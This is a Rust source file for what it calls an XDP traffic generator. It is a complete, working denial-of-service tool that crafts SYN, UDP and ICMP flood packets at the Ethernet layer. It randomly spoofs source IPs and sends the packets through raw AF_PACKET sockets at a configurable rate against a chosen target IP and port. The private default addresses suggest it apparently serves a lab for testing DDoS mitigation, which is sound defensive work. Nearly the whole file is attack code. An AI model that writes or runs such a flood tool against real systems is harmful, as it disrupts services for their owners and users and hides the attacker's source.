//! XDP Traffic Generator
//! 
//! Generates DDoS attack traffic using packet sockets with spoofed source IPs.

use anyhow::Result;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use tokio::sync::RwLock;
use tracing::{info, warn};

/// Attack type
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum AttackType {
    SynFlood,
    UdpFlood,
    IcmpFlood,
}

/// Attack configuration
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct AttackConfig {
    /// Target IP address
    pub target_ip: Ipv4Addr,
    /// Target port (for TCP/UDP)
    pub target_port: u16,
    /// Source IP range (CIDR-like, using /8 for 10.0.0.0/8)
    pub source_network: u8,
    /// Packets per second target
    pub pps: u32,
    /// Attack type
    pub attack_type: AttackType,
    /// Interface to send from
    pub interface: String,
    /// Gateway MAC address (for layer 2)
    pub gateway_mac: Option<[u8; 6]>,
}

impl Default for AttackConfig {
    fn default() -> Self {
        Self {
            target_ip: Ipv4Addr::new(192, 168, 1, 200),
            target_port: 443,
            source_network: 10,
            pps: 10_000,
            attack_type: AttackType::SynFlood,
            interface: "eno1".to_string(),
            gateway_mac: None,
        }
    }
}

/// Attack statistics
#[derive(Debug, Clone, Default, serde::Serialize)]
pub struct AttackStats {
    pub packets_sent: u64,
    pub bytes_sent: u64,
    pub errors: u64,
    pub running: bool,
    pub current_pps: u64,
}

/// Traffic generator state
pub struct TrafficGenerator {
    config: Arc<RwLock<AttackConfig>>,
    running: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
    bytes_sent: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
}

impl TrafficGenerator {
    pub fn new(config: AttackConfig) -> Self {
        Self {
            config: Arc::new(RwLock::new(config)),
            running: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
            bytes_sent: Arc::new(AtomicU64::new(0)),
            errors: Arc::new(AtomicU64::new(0)),
        }
    }

    /// Start the attack
    pub async fn start(&self) -> Result<()> {
        if self.running.load(Ordering::Relaxed) {
            warn!("Attack already running");
            return Ok(());
        }

        self.running.store(true, Ordering::Relaxed);
        let config = self.config.read().await.clone();
        
        info!(
            "Starting {:?} attack: {}.x.x.x -> {}:{} @ {} pps",
            config.attack_type,
            config.source_network,
            config.target_ip,
            config.target_port,
            config.pps
        );

        let running = self.running.clone();
        let packets_sent = self.packets_sent.clone();
        let bytes_sent = self.bytes_sent.clone();
        let errors = self.errors.clone();

        tokio::spawn(async move {
            if let Err(e) = run_attack(config, running, packets_sent, bytes_sent, errors).await {
                warn!("Attack error: {}", e);
            }
        });

        Ok(())
    }

    /// Stop the attack
    pub fn stop(&self) {
        info!("Stopping attack");
        self.running.store(false, Ordering::Relaxed);
    }

    /// Get current stats
    pub fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::Relaxed),
            bytes_sent: self.bytes_sent.load(Ordering::Relaxed),
            errors: self.errors.load(Ordering::Relaxed),
            running: self.running.load(Ordering::Relaxed),
            current_pps: 0,
        }
    }

    /// Update configuration
    pub async fn set_config(&self, config: AttackConfig) {
        *self.config.write().await = config;
    }

    /// Check if attack is running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }

    /// Reset stats
    pub fn reset_stats(&self) {
        self.packets_sent.store(0, Ordering::Relaxed);
        self.bytes_sent.store(0, Ordering::Relaxed);
        self.errors.store(0, Ordering::Relaxed);
    }
}

/// Get interface index
fn get_ifindex(name: &str) -> Result<i32> {
    let name_cstr = std::ffi::CString::new(name)?;
    let idx = unsafe { libc::if_nametoindex(name_cstr.as_ptr()) };
    if idx == 0 {
        return Err(anyhow::anyhow!("Interface {} not found", name));
    }
    Ok(idx as i32)
}

/// Get interface MAC address
fn get_mac(name: &str) -> Result<[u8; 6]> {
    let path = format!("/sys/class/net/{}/address", name);
    let mac_str = std::fs::read_to_string(&path)
        .map_err(|e| anyhow::anyhow!("Failed to read MAC from {}: {}", path, e))?;
    
    let parts: Vec<u8> = mac_str
        .trim()
        .split(':')
        .filter_map(|s| u8::from_str_radix(s, 16).ok())
        .collect();
    
    if parts.len() != 6 {
        return Err(anyhow::anyhow!("Invalid MAC format: {}", mac_str));
    }
    
    Ok([parts[0], parts[1], parts[2], parts[3], parts[4], parts[5]])
}

/// Get gateway MAC via ARP cache or by querying
fn get_gateway_mac(target_ip: Ipv4Addr) -> Result<[u8; 6]> {
    // Read ARP cache
    let arp = std::fs::read_to_string("/proc/net/arp")?;
    
    let target_str = target_ip.to_string();
    for line in arp.lines().skip(1) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 4 && parts[0] == target_str {
            // Skip incomplete entries (00:00:00:00:00:00)
            if parts[3] == "00:00:00:00:00:00" {
                continue;
            }
            let mac_parts: Vec<u8> = parts[3]
                .split(':')
                .filter_map(|s| u8::from_str_radix(s, 16).ok())
                .collect();
            if mac_parts.len() == 6 {
                info!("Found MAC {} for {} on interface {}", 
                      parts[3], target_ip, parts.get(5).unwrap_or(&"?"));
                return Ok([mac_parts[0], mac_parts[1], mac_parts[2], 
                          mac_parts[3], mac_parts[4], mac_parts[5]]);
            }
        }
    }
    
    Err(anyhow::anyhow!(
        "MAC for {} not in ARP cache. Try: ping -c1 {} first", 
        target_ip, target_ip
    ))
}

/// Run the attack loop using AF_PACKET
async fn run_attack(
    config: AttackConfig,
    running: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
    bytes_sent: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
) -> Result<()> {
    use rand::{Rng, SeedableRng};

    // Create AF_PACKET socket (layer 2)
    let fd = unsafe {
        libc::socket(
            libc::AF_PACKET,
            libc::SOCK_RAW,
            (libc::ETH_P_IP as u16).to_be() as i32,
        )
    };
    
    if fd < 0 {
        return Err(anyhow::anyhow!(
            "Failed to create packet socket: {}. Need root/CAP_NET_RAW",
            std::io::Error::last_os_error()
        ));
    }

    // Get interface index
    let ifindex = get_ifindex(&config.interface)?;
    info!("Interface {} index: {}", config.interface, ifindex);

    // Get source MAC
    let src_mac = get_mac(&config.interface)?;
    info!("Source MAC: {:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
          src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);

    // Get destination MAC (gateway or target)
    let dst_mac = match config.gateway_mac {
        Some(mac) => mac,
        None => {
            // Try to get MAC from ARP cache
            match get_gateway_mac(config.target_ip) {
                Ok(mac) => mac,
                Err(e) => {
                    warn!("{}", e);
                    // Try pinging to populate ARP cache
                    info!("Attempting to populate ARP cache...");
                    let _ = std::process::Command::new("ping")
                        .args(["-c", "1", "-W", "1", &config.target_ip.to_string()])
                        .output();
                    std::thread::sleep(std::time::Duration::from_millis(500));
                    get_gateway_mac(config.target_ip)?
                }
            }
        }
    };
    info!("Destination MAC: {:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
          dst_mac[0], dst_mac[1], dst_mac[2], dst_mac[3], dst_mac[4], dst_mac[5]);

    // Bind to interface
    let sll = libc::sockaddr_ll {
        sll_family: libc::AF_PACKET as u16,
        sll_protocol: (libc::ETH_P_IP as u16).to_be(),
        sll_ifindex: ifindex,
        sll_hatype: 0,
        sll_pkttype: 0,
        sll_halen: 6,
        sll_addr: [dst_mac[0], dst_mac[1], dst_mac[2], dst_mac[3], dst_mac[4], dst_mac[5], 0, 0],
    };

    let ret = unsafe {
        libc::bind(
            fd,
            &sll as *const _ as *const libc::sockaddr,
            std::mem::size_of::<libc::sockaddr_ll>() as libc::socklen_t,
        )
    };
    
    if ret < 0 {
        unsafe { libc::close(fd); }
        return Err(anyhow::anyhow!("Failed to bind packet socket: {}", std::io::Error::last_os_error()));
    }

    let mut rng = rand::rngs::StdRng::from_entropy();
    let interval_ns = if config.pps > 0 {
        1_000_000_000u64 / config.pps as u64
    } else {
        1_000_000
    };
    
    info!("Attack loop started, interval: {}ns per packet", interval_ns);

    while running.load(Ordering::Relaxed) {
        // Generate random source IP in 10.x.x.x range
        let src_ip = Ipv4Addr::new(
            config.source_network,
            rng.gen(),
            rng.gen(),
            rng.gen::<u8>().max(1),
        );

        // Build full Ethernet frame
        let packet = match config.attack_type {
            AttackType::SynFlood => craft_eth_syn_packet(
                &src_mac,
                &dst_mac,
                src_ip,
                config.target_ip,
                rng.gen_range(1024..65535),
                config.target_port,
                &mut rng,
            ),
            AttackType::UdpFlood => craft_eth_udp_packet(
                &src_mac,
                &dst_mac,
                src_ip,
                config.target_ip,
                rng.gen_range(1024..65535),
                config.target_port,
                &mut rng,
            ),
            AttackType::IcmpFlood => craft_eth_icmp_packet(
                &src_mac,
                &dst_mac,
                src_ip,
                config.target_ip,
                &mut rng,
            ),
        };

        let ret = unsafe {
            libc::sendto(
                fd,
                packet.as_ptr() as *const libc::c_void,
                packet.len(),
                0,
                &sll as *const _ as *const libc::sockaddr,
                std::mem::size_of::<libc::sockaddr_ll>() as libc::socklen_t,
            )
        };
        
        if ret >= 0 {
            packets_sent.fetch_add(1, Ordering::Relaxed);
            bytes_sent.fetch_add(ret as u64, Ordering::Relaxed);
        } else {
            errors.fetch_add(1, Ordering::Relaxed);
        }

        if interval_ns > 1000 {
            tokio::time::sleep(std::time::Duration::from_nanos(interval_ns)).await;
        }
    }

    unsafe { libc::close(fd); }
    info!("Attack loop stopped");
    Ok(())
}

/// Craft Ethernet + IP + TCP SYN packet
fn craft_eth_syn_packet<R: rand::Rng>(
    src_mac: &[u8; 6],
    dst_mac: &[u8; 6],
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    src_port: u16,
    dst_port: u16,
    rng: &mut R,
) -> Vec<u8> {
    let mut packet = vec![0u8; 14 + 20 + 20]; // Eth + IP + TCP
    
    // Ethernet header (14 bytes)
    packet[0..6].copy_from_slice(dst_mac);
    packet[6..12].copy_from_slice(src_mac);
    packet[12..14].copy_from_slice(&(0x0800u16).to_be_bytes()); // EtherType: IPv4
    
    // IP header (20 bytes) at offset 14
    let ip_offset = 14;
    packet[ip_offset] = 0x45; // Version + IHL
    packet[ip_offset + 1] = 0x00; // DSCP + ECN
    let total_len: u16 = 40; // IP + TCP
    packet[ip_offset + 2..ip_offset + 4].copy_from_slice(&total_len.to_be_bytes());
    packet[ip_offset + 4..ip_offset + 6].copy_from_slice(&rng.gen::<u16>().to_be_bytes()); // ID
    packet[ip_offset + 6] = 0x40; // Flags: DF
    packet[ip_offset + 7] = 0x00; // Fragment offset
    packet[ip_offset + 8] = 64; // TTL
    packet[ip_offset + 9] = 6; // Protocol: TCP
    // Checksum at 10-11
    packet[ip_offset + 12..ip_offset + 16].copy_from_slice(&src_ip.octets());
    packet[ip_offset + 16..ip_offset + 20].copy_from_slice(&dst_ip.octets());
    
    // IP checksum
    let ip_csum = checksum(&packet[ip_offset..ip_offset + 20]);
    packet[ip_offset + 10..ip_offset + 12].copy_from_slice(&ip_csum.to_be_bytes());
    
    // TCP header (20 bytes) at offset 34
    let tcp_offset = 34;
    packet[tcp_offset..tcp_offset + 2].copy_from_slice(&src_port.to_be_bytes());
    packet[tcp_offset + 2..tcp_offset + 4].copy_from_slice(&dst_port.to_be_bytes());
    packet[tcp_offset + 4..tcp_offset + 8].copy_from_slice(&rng.gen::<u32>().to_be_bytes()); // Seq
    packet[tcp_offset + 8..tcp_offset + 12].copy_from_slice(&0u32.to_be_bytes()); // Ack
    packet[tcp_offset + 12] = 0x50; // Data offset (5 words)
    packet[tcp_offset + 13] = 0x02; // Flags: SYN
    packet[tcp_offset + 14..tcp_offset + 16].copy_from_slice(&65535u16.to_be_bytes()); // Window
    // TCP checksum at 16-17 (pseudo-header based)
    let tcp_csum = tcp_checksum(&src_ip, &dst_ip, &packet[tcp_offset..]);
    packet[tcp_offset + 16..tcp_offset + 18].copy_from_slice(&tcp_csum.to_be_bytes());
    
    packet
}

/// Craft Ethernet + IP + UDP packet
fn craft_eth_udp_packet<R: rand::Rng>(
    src_mac: &[u8; 6],
    dst_mac: &[u8; 6],
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    src_port: u16,
    dst_port: u16,
    rng: &mut R,
) -> Vec<u8> {
    let payload = [0x58u8; 64]; // 'X' * 64
    let udp_len = 8 + payload.len();
    let ip_len = 20 + udp_len;
    let total_len = 14 + ip_len;
    
    let mut packet = vec![0u8; total_len];
    
    // Ethernet header
    packet[0..6].copy_from_slice(dst_mac);
    packet[6..12].copy_from_slice(src_mac);
    packet[12..14].copy_from_slice(&(0x0800u16).to_be_bytes());
    
    // IP header at offset 14
    let ip_offset = 14;
    packet[ip_offset] = 0x45;
    packet[ip_offset + 1] = 0x00;
    packet[ip_offset + 2..ip_offset + 4].copy_from_slice(&(ip_len as u16).to_be_bytes());
    packet[ip_offset + 4..ip_offset + 6].copy_from_slice(&rng.gen::<u16>().to_be_bytes());
    packet[ip_offset + 6] = 0x40;
    packet[ip_offset + 7] = 0x00;
    packet[ip_offset + 8] = 64;
    packet[ip_offset + 9] = 17; // UDP
    packet[ip_offset + 12..ip_offset + 16].copy_from_slice(&src_ip.octets());
    packet[ip_offset + 16..ip_offset + 20].copy_from_slice(&dst_ip.octets());
    
    let ip_csum = checksum(&packet[ip_offset..ip_offset + 20]);
    packet[ip_offset + 10..ip_offset + 12].copy_from_slice(&ip_csum.to_be_bytes());
    
    // UDP header at offset 34
    let udp_offset = 34;
    packet[udp_offset..udp_offset + 2].copy_from_slice(&src_port.to_be_bytes());
    packet[udp_offset + 2..udp_offset + 4].copy_from_slice(&dst_port.to_be_bytes());
    packet[udp_offset + 4..udp_offset + 6].copy_from_slice(&(udp_len as u16).to_be_bytes());
    // UDP checksum optional for IPv4
    packet[udp_offset + 8..udp_offset + 8 + payload.len()].copy_from_slice(&payload);
    
    packet
}

/// Craft Ethernet + IP + ICMP packet
fn craft_eth_icmp_packet<R: rand::Rng>(
    src_mac: &[u8; 6],
    dst_mac: &[u8; 6],
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    rng: &mut R,
) -> Vec<u8> {
    let mut packet = vec![0u8; 14 + 20 + 8]; // Eth + IP + ICMP
    
    // Ethernet header
    packet[0..6].copy_from_slice(dst_mac);
    packet[6..12].copy_from_slice(src_mac);
    packet[12..14].copy_from_slice(&(0x0800u16).to_be_bytes());
    
    // IP header at offset 14
    let ip_offset = 14;
    packet[ip_offset] = 0x45;
    packet[ip_offset + 1] = 0x00;
    packet[ip_offset + 2..ip_offset + 4].copy_from_slice(&28u16.to_be_bytes()); // IP + ICMP
    packet[ip_offset + 4..ip_offset + 6].copy_from_slice(&rng.gen::<u16>().to_be_bytes());
    packet[ip_offset + 6] = 0x40;
    packet[ip_offset + 7] = 0x00;
    packet[ip_offset + 8] = 64;
    packet[ip_offset + 9] = 1; // ICMP
    packet[ip_offset + 12..ip_offset + 16].copy_from_slice(&src_ip.octets());
    packet[ip_offset + 16..ip_offset + 20].copy_from_slice(&dst_ip.octets());
    
    let ip_csum = checksum(&packet[ip_offset..ip_offset + 20]);
    packet[ip_offset + 10..ip_offset + 12].copy_from_slice(&ip_csum.to_be_bytes());
    
    // ICMP header at offset 34
    let icmp_offset = 34;
    packet[icmp_offset] = 8; // Echo request
    packet[icmp_offset + 1] = 0; // Code
    packet[icmp_offset + 4..icmp_offset + 6].copy_from_slice(&rng.gen::<u16>().to_be_bytes()); // ID
    packet[icmp_offset + 6..icmp_offset + 8].copy_from_slice(&1u16.to_be_bytes()); // Seq
    
    let icmp_csum = checksum(&packet[icmp_offset..]);
    packet[icmp_offset + 2..icmp_offset + 4].copy_from_slice(&icmp_csum.to_be_bytes());
    
    packet
}

/// Calculate Internet checksum
fn checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut i = 0;
    
    while i + 1 < data.len() {
        sum += u16::from_be_bytes([data[i], data[i + 1]]) as u32;
        i += 2;
    }
    
    if i < data.len() {
        sum += (data[i] as u32) << 8;
    }
    
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    !(sum as u16)
}

/// Calculate TCP checksum with pseudo-header
fn tcp_checksum(src_ip: &Ipv4Addr, dst_ip: &Ipv4Addr, tcp_segment: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    
    // Pseudo-header
    let src = src_ip.octets();
    let dst = dst_ip.octets();
    sum += u16::from_be_bytes([src[0], src[1]]) as u32;
    sum += u16::from_be_bytes([src[2], src[3]]) as u32;
    sum += u16::from_be_bytes([dst[0], dst[1]]) as u32;
    sum += u16::from_be_bytes([dst[2], dst[3]]) as u32;
    sum += 6u32; // Protocol: TCP
    sum += tcp_segment.len() as u32;
    
    // TCP segment (with checksum field zeroed)
    let mut i = 0;
    while i + 1 < tcp_segment.len() {
        // Skip checksum field (bytes 16-17)
        if i == 16 {
            i += 2;
            continue;
        }
        sum += u16::from_be_bytes([tcp_segment[i], tcp_segment[i + 1]]) as u32;
        i += 2;
    }
    
    if i < tcp_segment.len() {
        sum += (tcp_segment[i] as u32) << 8;
    }
    
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    !(sum as u16)
}
